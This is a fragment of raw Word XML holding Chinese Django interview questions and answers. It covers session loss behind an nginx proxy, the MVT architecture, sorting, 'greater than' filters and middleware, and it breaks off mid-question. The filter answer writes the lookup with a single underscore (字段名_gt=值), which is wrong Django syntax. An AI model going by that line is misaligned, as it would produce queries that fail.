        <w:wordWrap w:val="0"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4F4F4F"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="t27"/>
      <w:bookmarkEnd w:id="17"/>
      <w:r w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>03</w:t>
      </w:r>
      <w:r w:rsidR="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6</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中当用户登录到</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>服务器进入登陆状态，下次被</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>代理到</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>服务器会出现什么影响？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446E0350" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80"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Pr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>如果用户在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>应用服务器登陆的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>数据没有共享到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>应用服务器，那么之前的登录状态就没有了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5774541A" w14:textId="6F9E6918"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18" w:name="t28"/>
      <w:bookmarkEnd w:id="18"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>00</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</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 xml:space="preserve">django </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中当一个用户登录</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> A </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>应用服务器（进入登录状态），然后下次请求被</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> nginx </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>代理到</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> B </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>应用服务器会出现什么影响？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24CB441C"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如果用户在</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>应用服务器登陆的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>数据没有共享到</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>应用服务器，纳米之前的登录状态就没有了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55292C13" w14:textId="564CF457"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w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</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请解释或描述一下</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的架构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278CA78D"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对于</w:t>
      </w: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框架遵循</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设计，并且有一个专有名词：</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MVT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A048D1C"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M</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>全拼为</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，与</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>功能相同，负责数据处理，内嵌了</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA6508C"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V</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>全拼为</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>View</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，与</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>功能相同，接收</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，业务处理，返回</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366D01D9"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T</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>全拼为</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Template</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，与</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>功能相同，负责封装构造要返回的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，内嵌了模板引擎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EECA665" w14:textId="188D5F57"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004</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django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对数据查询结果排序怎么做，降序怎么做，查询大于某个字段怎么做</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B82BE3"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排序使用</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>order_by()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7869F9"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降序需要在排序字段名前加</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29864C60"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查询字段大于某个值：使用</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>filter(</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字段名</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>_gt=</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>值</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202CCD54" w14:textId="547B87CD"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005</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说一下</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">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MIDDLEWARES</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中间件的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CDC9CF"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答：中间件是介于</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>处理之间的一道处理过程，相对比较轻量级，并且在全局上改变</w:t>
      </w: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的输入与输出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC3F02C" w14:textId="6AA5D53F"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006</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你对</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
